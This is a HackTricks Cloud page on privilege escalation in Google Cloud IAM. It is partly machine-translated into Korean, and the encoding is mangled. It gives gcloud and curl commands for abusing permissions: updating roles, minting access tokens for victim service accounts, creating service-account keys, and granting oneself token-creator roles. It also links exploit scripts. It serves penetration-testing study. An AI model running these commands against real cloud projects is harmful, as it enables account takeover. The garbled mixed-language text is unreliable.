# GCP - IAM Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## IAM

IAMì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../gcp-services/gcp-iam-and-org-policies-enum.md" %}
[gcp-iam-and-org-policies-enum.md](../gcp-services/gcp-iam-and-org-policies-enum.md)
{% endcontent-ref %}

### `iam.roles.update` (`iam.roles.get`)

ì–¸ê¸‰ëœ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” ê·€í•˜ì—ê²Œ í• ë‹¹ëœ ì—­í• ì„ ì—…ë°ì´íŠ¸í•˜ê³  ë‹¤ìŒê³¼ ê°™ì€ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì¶”ê°€ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
gcloud iam roles update <rol name> --project <project> --add-permissions <permission>
```
You can find a script to automate the **creation, exploit and cleaning of a vuln environment here** and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.getAccessToken` (`iam.serviceAccounts.get`)

ì–¸ê¸‰ëœ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ì„œë¹„ìŠ¤ ê³„ì •ì— ì†í•˜ëŠ” ì•¡ì„¸ìŠ¤ í† í°ì„ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**, ë”°ë¼ì„œ ìš°ë¦¬ì˜ ê¶Œí•œë³´ë‹¤ ë” ë§ì€ ê¶Œí•œì„ ê°€ì§„ ì„œë¹„ìŠ¤ ê³„ì •ì˜ ì•¡ì„¸ìŠ¤ í† í°ì„ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
gcloud --impersonate-service-account="${victim}@${PROJECT_ID}.iam.gserviceaccount.com" \
auth print-access-token
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/4-iam.serviceAccounts.getAccessToken.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccountKeys.create`

An attacker with the mentioned permissions will be able to **ì„œë¹„ìŠ¤ ê³„ì •ì— ëŒ€í•œ ì‚¬ìš©ì ê´€ë¦¬ í‚¤ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ í•´ë‹¹ ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ GCPì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
gcloud iam service-accounts keys create --iam-account <name> /tmp/key.json

gcloud auth activate-service-account --key-file=sa_cred.json
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/3-iam.serviceAccountKeys.create.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

Note that **`iam.serviceAccountKeys.update`ëŠ” SAì˜ í‚¤ë¥¼ ìˆ˜ì •í•˜ëŠ” ë° ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê·¸ë ‡ê²Œ í•˜ë ¤ë©´ `iam.serviceAccountKeys.create` ê¶Œí•œë„ í•„ìš”í•©ë‹ˆë‹¤.

### `iam.serviceAccounts.implicitDelegation`

If you have the **`iam.serviceAccounts.implicitDelegation`** permission on a Service Account that has the **`iam.serviceAccounts.getAccessToken`** permission on a third Service Account, then you can use implicitDelegation to **create a token for that third Service Account**. Here is a diagram to help explain.

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image2-500x493.png)

Note that according to the [**documentation**](https://cloud.google.com/iam/docs/understanding-service-accounts), the delegation of `gcloud` only works to generate a token using the [**generateAccessToken()**](https://cloud.google.com/iam/credentials/reference/rest/v1/projects.serviceAccounts/generateAccessToken) method. So here you have how to get a token using the API directly:
```bash
curl -X POST \
'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'"${TARGET_SERVICE_ACCOUNT}"':generateAccessToken' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer '"$(gcloud auth print-access-token)" \
-d '{
"delegates": ["projects/-/serviceAccounts/'"${DELEGATED_SERVICE_ACCOUNT}"'"],
"scope": ["https://www.googleapis.com/auth/cloud-platform"]
}'
```
You can find a script to automate the [**ì·¨ì•½í•œ í™˜ê²½ì˜ ìƒì„±, ì•…ìš© ë° ì •ë¦¬ ì—¬ê¸°**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/5-iam.serviceAccounts.implicitDelegation.sh) and a python script to abuse this privilege [**ì—¬ê¸°**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py). For more information check the [**ì›ë³¸ ì—°êµ¬**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signBlob`

An attacker with the mentioned permissions will be able to **GCPì—ì„œ ì„ì˜ì˜ í˜ì´ë¡œë“œ ì„œëª…**. So it'll be possible to **SAì˜ ì„œëª…ë˜ì§€ ì•Šì€ JWTë¥¼ ìƒì„±í•œ ë‹¤ìŒ, ì´ë¥¼ blobìœ¼ë¡œ ë³´ë‚´ì–´ ìš°ë¦¬ê°€ ëª©í‘œë¡œ í•˜ëŠ” SAì— ì˜í•´ JWTê°€ ì„œëª…ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. For more information [**ì´ê²ƒì„ ì½ì–´ë³´ì„¸ìš”**](https://medium.com/google-cloud/using-serviceaccountactor-iam-role-for-account-impersonation-on-google-cloud-platform-a9e7118480ed).

You can find a script to automate the [**ì·¨ì•½í•œ í™˜ê²½ì˜ ìƒì„±, ì•…ìš© ë° ì •ë¦¬ ì—¬ê¸°**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/6-iam.serviceAccounts.signBlob.sh) and a python script to abuse this privilege [**ì—¬ê¸°**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py) and [**ì—¬ê¸°**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py). For more information check the [**ì›ë³¸ ì—°êµ¬**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signJwt`

An attacker with the mentioned permissions will be able to **í˜•ì‹ì´ ì˜¬ë°”ë¥¸ JSON ì›¹ í† í°(JWT) ì„œëª…**. The difference with the previous method is that **JWTë¥¼ í¬í•¨í•˜ëŠ” blobì„ êµ¬ê¸€ì— ì„œëª…í•˜ê²Œ í•˜ëŠ” ëŒ€ì‹ , ì´ë¯¸ JWTë¥¼ ê¸°ëŒ€í•˜ëŠ” signJWT ë©”ì„œë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤**. This makes it easier to use but you can only sign JWT instead of any bytes.

You can find a script to automate the [**ì·¨ì•½í•œ í™˜ê²½ì˜ ìƒì„±, ì•…ìš© ë° ì •ë¦¬ ì—¬ê¸°**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/7-iam.serviceAccounts.signJWT.sh) and a python script to abuse this privilege [**ì—¬ê¸°**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py). For more information check the [**ì›ë³¸ ì—°êµ¬**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.setIamPolicy` <a href="#iam.serviceaccounts.setiampolicy" id="iam.serviceaccounts.setiampolicy"></a>

An attacker with the mentioned permissions will be able to **ì„œë¹„ìŠ¤ ê³„ì •ì— IAM ì •ì±… ì¶”ê°€**. You can abuse it to **ìì‹ ì—ê²Œ** ì„œë¹„ìŠ¤ ê³„ì •ì„ ê°€ì¥í•˜ëŠ” ë° í•„ìš”í•œ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. In the following example we are granting ourselves the `roles/iam.serviceAccountTokenCreator` role over the interesting SA:
```bash
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountTokenCreator"

# If you still have prblem grant yourself also this permission
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \ \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountUser"
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/d-iam.serviceAccounts.setIamPolicy.sh)**.**

### `iam.serviceAccounts.actAs`

The **iam.serviceAccounts.actAs permission** is like the **iam:PassRole permission from AWS**. It's essential for executing tasks, like initiating a Compute Engine instance, as it grants the ability to "actAs" a Service Account, ensuring secure permission management. Without this, users might gain undue access. Additionally, exploiting the **iam.serviceAccounts.actAs** involves various methods, each requiring a set of permissions, contrasting with other methods that need just one.

#### Service account impersonation <a href="#service-account-impersonation" id="service-account-impersonation"></a>

ì„œë¹„ìŠ¤ ê³„ì •ì„ ê°€ì¥í•˜ëŠ” ê²ƒì€ **ìƒˆë¡­ê³  ë” ë‚˜ì€ ê¶Œí•œì„ ì–»ê¸° ìœ„í•´** ë§¤ìš° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë¥¸ ì„œë¹„ìŠ¤ ê³„ì •ì„ [ê°€ì¥í•˜ëŠ” ì„¸ ê°€ì§€ ë°©ë²•](https://cloud.google.com/iam/docs/understanding-service-accounts#impersonating\_a\_service\_account)ì´ ìˆìŠµë‹ˆë‹¤:

* RSA ê°œì¸ í‚¤ë¥¼ **ì‚¬ìš©í•œ ì¸ì¦** (ìœ„ì—ì„œ ë‹¤ë£¸)
* Cloud IAM ì •ì±…ì„ **ì‚¬ìš©í•œ ê¶Œí•œ ë¶€ì—¬** (ì—¬ê¸°ì„œ ë‹¤ë£¸)
* GCP ì„œë¹„ìŠ¤ì—ì„œ **ì‘ì—… ë°°í¬** (ì‚¬ìš©ì ê³„ì •ì˜ ì†ìƒì— ë” ì ìš© ê°€ëŠ¥)

### `iam.serviceAccounts.getOpenIdToken`

ì–¸ê¸‰ëœ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” OpenID JWTë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì‹ ì›ì„ ì£¼ì¥í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©° ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì•”ë¬µì ì¸ ê¶Œí•œ ë¶€ì—¬ë¥¼ ë°˜ë“œì‹œ í¬í•¨í•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤.

ì´ [**í¥ë¯¸ë¡œìš´ ê²Œì‹œë¬¼**](https://medium.com/google-cloud/authenticating-using-google-openid-connect-tokens-e7675051213b)ì— ë”°ë¥´ë©´, ì²­ì¤‘(í† í°ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦í•˜ë ¤ëŠ” ì„œë¹„ìŠ¤)ì„ ì§€ì •í•´ì•¼ í•˜ë©°, ê·¸ëŸ¬ë©´ ì„œë¹„ìŠ¤ ê³„ì •ê³¼ JWTì˜ ì²­ì¤‘ì„ ë‚˜íƒ€ë‚´ëŠ” Googleì´ ì„œëª…í•œ JWTë¥¼ ë°›ê²Œ ë©ë‹ˆë‹¤.

ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ” ê²½ìš° OpenIDTokenì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# First activate the SA with iam.serviceAccounts.getOpenIdToken over the other SA
gcloud auth activate-service-account --key-file=/path/to/svc_account.json
# Then, generate token
gcloud auth print-identity-token "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" --audiences=https://example.com
```
ê·¸ëŸ¼ ë‹¤ìŒê³¼ ê°™ì´ ì„œë¹„ìŠ¤ë¥¼ ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -v -H "Authorization: Bearer id_token" https://some-cloud-run-uc.a.run.app
```
ë‹¤ìŒê³¼ ê°™ì€ í† í°ì„ í†µí•´ ì¸ì¦ì„ ì§€ì›í•˜ëŠ” ì„œë¹„ìŠ¤ê°€ ìˆìŠµë‹ˆë‹¤:

* [Google Cloud Run](https://cloud.google.com/run/)
* [Google Cloud Functions](https://cloud.google.com/functions/docs/)
* [Google Identity Aware Proxy](https://cloud.google.com/iap/docs/authentication-howto)
* [Google Cloud Endpoints](https://cloud.google.com/endpoints/docs/openapi/authenticating-users-google-id) (Google OIDC ì‚¬ìš© ì‹œ)

ì„œë¹„ìŠ¤ ê³„ì •ì„ ëŒ€ì‹ í•˜ì—¬ OpenID í† í°ì„ ìƒì„±í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì˜ˆì‹œëŠ” [**ì—¬ê¸°**](https://github.com/carlospolop-forks/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getOpenIdToken.py)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## References

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
